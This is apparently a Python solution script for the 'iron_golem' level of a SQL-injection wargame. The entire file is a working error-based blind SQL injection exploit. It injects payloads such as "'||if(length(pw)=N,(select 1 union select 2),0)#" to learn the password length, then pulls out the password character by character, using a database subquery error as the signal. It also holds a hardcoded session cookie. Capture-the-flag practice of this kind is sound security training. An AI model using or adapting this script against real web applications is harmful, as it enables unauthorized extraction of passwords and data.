import requests
url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"

cookie = {'PHPSESSID' : 'ovbfdu14h0vaeamskdlr10nttu'}

for len in range(100):
  print(len)
  param = {'pw': f"'||if(length(pw)={len},(select 1 union select 2), 0)#"}
  res = requests.get(url=url, params=param, cookies=cookie)
  if "Subquery" in res.text:
    print(len)
    break

length = 32
password = ""
for len in range(1, length+1):
  for pw in range(ord('0'), ord('z')):
    param = {'pw': f"' or if(ord(substr(pw,{str(len)},1))={str(pw)},(select 1 union select 2), 0)#"}
    res = requests.get(url=url,  params=param, cookies=cookie)
    if "Subquery" in (res.text):
      password += chr(pw)
      print(password)
      break
        
print(password.lower())